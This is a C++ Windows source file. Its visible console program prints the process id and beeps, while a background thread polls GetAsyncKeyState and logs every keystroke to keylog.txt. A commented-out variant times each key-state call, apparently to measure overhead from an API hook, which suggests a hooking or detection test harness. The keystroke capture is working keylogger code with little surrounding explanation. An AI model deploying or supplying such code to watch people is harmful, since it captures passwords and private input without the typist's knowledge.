#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>
#include <thread>
#include <atomic>
#include <map>

// Atomic flag to signal the logger thread to stop
std::atomic<bool> g_Running{ true };

// Map to keep track of key states (pressed or not)
std::map<int, bool> keyStates;

// Converts virtual key code to readable string
std::string VkCodeToString(int vkCode) {
	// Alphabet
	if (vkCode >= 'A' && vkCode <= 'Z')
		return std::string(1, char(vkCode));
	// Numbers
	if (vkCode >= '0' && vkCode <= '9')
		return std::string(1, char(vkCode));
	// Space
	if (vkCode == VK_SPACE)
		return " ";
	// Enter
	if (vkCode == VK_RETURN)
		return "[ENTER]\n";
	// Tab
	if (vkCode == VK_TAB)
		return "[TAB]";
	// Backspace
	if (vkCode == VK_BACK)
		return "[BACKSPACE]";
	// Shift, Ctrl, Alt, etc.
	if (vkCode == VK_SHIFT)
		return "[SHIFT]";
	if (vkCode == VK_CONTROL)
		return "[CTRL]";
	if (vkCode == VK_MENU)
		return "[ALT]";
	// Add more as needed
	return "[UNK]";
}

// Keyboard logger function (runs in background)
void KeyLoggerThread() {
	std::ofstream logFile("keylog.txt", std::ios::app);
	if (!logFile.is_open()) {
		std::cerr << "Could not open keylog.txt for writing!" << std::endl;
		return;
	}

	// List of VK codes to monitor (A-Z, 0-9, special keys)
	for (int k = 0x08; k <= 0xFE; ++k)
		keyStates[k] = false;

	while (g_Running) {
		for (int vkCode = 0x08; vkCode <= 0xFE; ++vkCode) {
			SHORT keyState = GetAsyncKeyState(vkCode);
			bool isPressed = (keyState & 0x8000) != 0;
			if (isPressed && !keyStates[vkCode]) {
				// Key just pressed
				std::string keyStr = VkCodeToString(vkCode);
				logFile << keyStr;
				logFile.flush();
				keyStates[vkCode] = true;
			}
			else if (!isPressed) {
				// Key released
				keyStates[vkCode] = false;
			}
		}
		Sleep(10); // Poll every 10 ms
	}
	logFile.close();
}

int main()
{
	// Start the keylogger thread
	std::thread logger(KeyLoggerThread);

	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);
	}

	// Never reached, but good practice
	g_Running = false;
	logger.join();

	return 0;
}

/*
#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>
#include <thread>
#include <atomic>
#include <map>
#include <chrono>

// Atomic flag to signal the logger thread to stop
std::atomic<bool> g_Running{ true };

// Map to keep track of key states (pressed or not)
std::map<int, bool> keyStates;

// Converts virtual key code to readable string
std::string VkCodeToString(int vkCode) {
	if (vkCode >= 'A' && vkCode <= 'Z')
		return std::string(1, char(vkCode));
	if (vkCode >= '0' && vkCode <= '9')
		return std::string(1, char(vkCode));
	if (vkCode == VK_SPACE)
		return " ";
	if (vkCode == VK_RETURN)
		return "[ENTER]\n";
	if (vkCode == VK_TAB)
		return "[TAB]";
	if (vkCode == VK_BACK)
		return "[BACKSPACE]";
	if (vkCode == VK_SHIFT)
		return "[SHIFT]";
	if (vkCode == VK_CONTROL)
		return "[CTRL]";
	if (vkCode == VK_MENU)
		return "[ALT]";
	return "[UNK]";
}

// Keyboard logger function (runs in background)
void KeyLoggerThread() {
	std::ofstream logFile("keylog.txt", std::ios::app);
	if (!logFile.is_open()) {
		std::cerr << "Could not open keylog.txt for writing!" << std::endl;
		return;
	}

	for (int k = 0x08; k <= 0xFE; ++k)
		keyStates[k] = false;

	while (g_Running) {
		for (int vkCode = 0x08; vkCode <= 0xFE; ++vkCode) {

			// ✅ Measure overhead including GetAsyncKeyState (affected by hook)
			auto start = std::chrono::high_resolution_clock::now();
			SHORT keyState = GetAsyncKeyState(vkCode);
			auto end = std::chrono::high_resolution_clock::now();
			std::chrono::duration<double, std::micro> overhead = end - start;

			bool isPressed = (keyState & 0x8000) != 0;

			if (isPressed && !keyStates[vkCode]) {
				std::string keyStr = VkCodeToString(vkCode);
				logFile << keyStr;
				logFile.flush();

				std::cout << "[Key: " << keyStr << "] Overhead: "
					<< overhead.count() << " microseconds\n";

				keyStates[vkCode] = true;
			}
			else if (!isPressed) {
				keyStates[vkCode] = false;
			}
		}
		Sleep(10); // Poll every 10 ms
	}

	logFile.close();
}

int main() {
	std::thread logger(KeyLoggerThread);

	std::string value;
	while (true) {
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: " << GetProcessIdOfThread(currentThread) << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);
	}

	g_Running = false;
	logger.join();
	return 0;
}
*/
